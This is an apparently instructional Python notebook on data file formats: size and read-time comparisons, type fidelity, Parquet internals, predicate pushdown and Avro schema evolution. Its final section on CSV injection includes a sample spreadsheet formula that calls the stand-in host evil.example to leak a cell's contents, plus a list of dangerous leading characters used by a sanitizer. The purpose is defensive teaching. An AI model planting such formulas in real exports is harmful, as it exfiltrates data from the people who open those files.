# %% [markdown]
# # Lab 11.1: What's inside the files
#
# 1. The same table as CSV, NDJSON, Avro, Parquet (snappy / zstd), Arrow IPC: size and read time.
# 2. Round-trip fidelity: which formats preserve types.
# 3. Inside a Parquet file: row groups, statistics, encodings.
# 4. Predicate pushdown: sorted vs unsorted data, row groups skipped.
# 5. Avro schema evolution: adding a field with and without a default.
# 6. CSV injection: sanitizing an export.

# %%
import csv
import io
import json
import shutil
import sys
import tempfile
import time
from pathlib import Path

import duckdb
import fastavro
import numpy as np
import pandas as pd
import pyarrow as pa
import pyarrow.feather as feather
import pyarrow.parquet as pq

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "_shared"))
from shop import make_shop  # noqa: E402

tmp = Path(tempfile.mkdtemp())
t = make_shop(n_customers=30_000, seed=9)
df = (t["order_items"].merge(t["orders"], on="order_id")
      .merge(t["customers"][["customer_id", "country"]], on="customer_id")
      .assign(amount=lambda d: d["quantity"] * d["unit_price"]))
df["customer_id"] = df["customer_id"].astype("int64")
print(f"{len(df):,} rows, columns: {list(df.columns)}")

# %% [markdown]
# ## 1. Sizes and read times

# %%
paths = {}
paths["csv"] = tmp / "d.csv"; df.to_csv(paths["csv"], index=False)
paths["ndjson"] = tmp / "d.ndjson"; df.to_json(paths["ndjson"], orient="records", lines=True, date_format="iso")
paths["parquet-snappy"] = tmp / "d_snappy.parquet"; df.to_parquet(paths["parquet-snappy"], compression="snappy")
paths["parquet-zstd"] = tmp / "d_zstd.parquet"; df.to_parquet(paths["parquet-zstd"], compression="zstd")
paths["arrow-ipc"] = tmp / "d.arrow"; feather.write_feather(pa.Table.from_pandas(df), paths["arrow-ipc"], compression="uncompressed")
schema = {"type": "record", "name": "Line", "fields": [
    {"name": "order_id", "type": "long"}, {"name": "product_id", "type": "long"}, {"name": "quantity", "type": "long"},
    {"name": "unit_price", "type": "double"}, {"name": "customer_id", "type": "long"},
    {"name": "order_ts", "type": {"type": "long", "logicalType": "timestamp-micros"}},
    {"name": "status", "type": "string"}, {"name": "channel", "type": "string"},
    {"name": "country", "type": "string"}, {"name": "amount", "type": "double"}]}
records = df.assign(order_ts=df["order_ts"].dt.tz_localize("UTC").dt.to_pydatetime()).to_dict("records")
paths["avro"] = tmp / "d.avro"
with open(paths["avro"], "wb") as f:
    fastavro.writer(f, fastavro.parse_schema(schema), records, codec="deflate")

readers = {
    "csv": lambda p: pd.read_csv(p),
    "ndjson": lambda p: pd.read_json(p, lines=True),
    "parquet-snappy": pd.read_parquet, "parquet-zstd": pd.read_parquet,
    "arrow-ipc": lambda p: feather.read_table(p).to_pandas(),
    "avro": lambda p: pd.DataFrame(list(fastavro.reader(open(p, "rb")))),
}
rows, loaded = [], {}
for name, p in paths.items():
    t0 = time.perf_counter(); loaded[name] = readers[name](p); dt = time.perf_counter() - t0
    rows.append((name, p.stat().st_size / 1e6, dt))
res = pd.DataFrame(rows, columns=["format", "MB", "read_s"]).sort_values("MB")
print(res.to_string(index=False, float_format="%.2f"))
size = dict(zip(res["format"], res["MB"]))
assert size["parquet-zstd"] < size["csv"] / 3 and size["parquet-zstd"] < size["ndjson"] / 5

# %% [markdown]
# ## 2. Type fidelity

# %%
def dtypes(d):
    return {c: str(d[c].dtype) for c in ["customer_id", "order_ts", "unit_price", "status"]}


print("original:", dtypes(df))
for name in ("csv", "parquet-zstd", "arrow-ipc"):
    print(f"{name:13s}", dtypes(loaded[name]))
assert pd.api.types.is_datetime64_any_dtype(loaded["parquet-zstd"]["order_ts"])
assert not pd.api.types.is_datetime64_any_dtype(loaded["csv"]["order_ts"]), "CSV gives you strings back"

big_id = 2**53 + 1
parsed = json.loads(json.dumps({"id": big_id}), parse_int=float)
print(f"a 64-bit id through a float-based JSON parser: {big_id} -> {int(parsed['id'])}")
assert int(parsed["id"]) != big_id

# %% [markdown]
# ## 3. Inside a Parquet file

# %%
sorted_path = tmp / "sorted.parquet"
pq.write_table(pa.Table.from_pandas(df.sort_values("order_ts")), sorted_path, row_group_size=20_000, compression="zstd")
md = pq.ParquetFile(sorted_path).metadata
print(f"row groups: {md.num_row_groups}, rows: {md.num_rows}, columns: {md.num_columns}")
col = md.schema.names.index("order_ts")
for rg in range(3):
    stats = md.row_group(rg).column(col).statistics
    print(f"  row group {rg}: order_ts min {stats.min}  max {stats.max}")
cc = md.row_group(0).column(md.schema.names.index("country"))
print("country column encodings:", cc.encodings)
assert any("DICT" in e for e in cc.encodings), "low-cardinality strings are dictionary-encoded"

# %% [markdown]
# ## 4. Predicate pushdown: sorted vs unsorted

# %%
unsorted_path = tmp / "unsorted.parquet"
pq.write_table(pa.Table.from_pandas(df.sample(frac=1, random_state=0)), unsorted_path, row_group_size=20_000, compression="zstd")


def groups_that_might_match(path, lo):
    f = pq.ParquetFile(path)
    col = f.metadata.schema.names.index("order_ts")
    need = 0
    for rg in range(f.metadata.num_row_groups):
        st = f.metadata.row_group(rg).column(col).statistics
        need += st.max >= lo
    return need, f.metadata.num_row_groups


lo = pd.Timestamp("2025-09-01")
s_need, s_total = groups_that_might_match(sorted_path, lo)
u_need, u_total = groups_that_might_match(unsorted_path, lo)
print(f"filter order_ts >= {lo.date()}: sorted file must read {s_need}/{s_total} row groups, unsorted {u_need}/{u_total}")
assert s_need < s_total / 2 and u_need == u_total

q = "SELECT COUNT(*) FROM '{}' WHERE order_ts >= TIMESTAMP '2025-09-01'"
assert duckdb.sql(q.format(sorted_path)).fetchone() == duckdb.sql(q.format(unsorted_path)).fetchone()

# %% [markdown]
# ## 5. Avro schema evolution

# %%
v1 = {"type": "record", "name": "Customer", "fields": [{"name": "id", "type": "long"}, {"name": "email", "type": "string"}]}
v2_default = {"type": "record", "name": "Customer", "fields": v1["fields"] + [{"name": "phone", "type": ["null", "string"], "default": None}]}
v2_nodefault = {"type": "record", "name": "Customer", "fields": v1["fields"] + [{"name": "phone", "type": "string"}]}

buf = io.BytesIO()
fastavro.writer(buf, fastavro.parse_schema(v1), [{"id": 1, "email": "a@b.c"}])
old_data = buf.getvalue()

new_reader_ok = list(fastavro.reader(io.BytesIO(old_data), reader_schema=fastavro.parse_schema(v2_default)))
assert new_reader_ok == [{"id": 1, "email": "a@b.c", "phone": None}]
try:
    list(fastavro.reader(io.BytesIO(old_data), reader_schema=fastavro.parse_schema(v2_nodefault)))
    raise AssertionError("should fail: new required field without a default")
except fastavro.read.SchemaResolutionError:
    print("v2 without a default can't read v1 data: that's the breaking change a schema registry would reject")

# %% [markdown]
# ## 6. CSV injection

# %%
DANGEROUS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(v):
    return "'" + v if isinstance(v, str) and v.startswith(DANGEROUS) else v


users = [{"name": "Ana Garcia"}, {"name": "=HYPERLINK(\"http://evil.example/?x=\"&A2,\"click\")"}, {"name": "-2+3"}]
out = io.StringIO()
w = csv.DictWriter(out, fieldnames=["name"])
w.writeheader()
w.writerows({"name": sanitize_cell(u["name"])} for u in users)
exported = out.getvalue().splitlines()[1:]
print("sanitized export:", exported)
assert all(not line.strip('"').startswith(DANGEROUS) for line in exported)

shutil.rmtree(tmp)
print("\nAll checks passed.")
